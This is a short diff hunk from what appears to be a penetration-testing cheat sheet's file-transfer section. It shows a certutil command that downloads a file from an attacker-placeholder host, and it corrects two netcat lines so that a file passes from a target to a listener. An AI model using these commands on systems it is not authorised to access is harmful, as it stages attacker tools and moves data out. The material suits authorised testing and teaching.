@@ -538,8 +538,8 @@ certutil -urlcache -split -f "http://<LHOST>/<FILE>" <FILE>
 ##### Netcat
 
 ```c
-nc -lnvp <LPORT> < <FILE>
-nc <RHOST> <RPORT> > <FILE>
+nc -lnvp <LPORT> > <FILE>
+nc <RHOST> <RPORT> < <FILE>
 ```
 
 ##### Impacket
